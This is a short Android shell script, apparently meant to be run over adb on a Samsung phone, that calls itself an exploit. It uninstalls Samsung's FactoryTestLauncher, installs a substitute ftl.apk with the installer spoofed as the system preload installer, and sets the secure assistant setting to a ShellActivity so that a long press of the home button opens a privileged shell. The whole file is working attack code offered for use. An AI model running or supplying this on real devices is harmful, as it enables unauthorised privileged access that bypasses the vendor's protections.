#!/bin/sh

echo "Made by @"
sleep 1

# Start

pm uninstall --user 0 com.samsung.android.FactoryTestLauncher

echo "SUCCESS"

home=(/sdcard/Exploit)
tmp=(/data/local/tmp)

cp ftl.apk "$tmp" && cd "$tmp" && pm install -i com.sec.android.preloadinstaller ftl.apk

# Setup

echo "The exploit is done"
sleep 1
echo "But still not 100% done"
sleep 1
settings put secure assistant "com.samsung.android.FactoryTestLauncher/.addons.Shell.ShellActivity"
sleep 1
echo "Exploiting..."
cd "$home"
cp factory_ftl_default.xml /sdcard
sleep 1
echo "Exploit injected"

# Open the exploit

echo "Pls.. long press the home button"
sleep 1
exit 1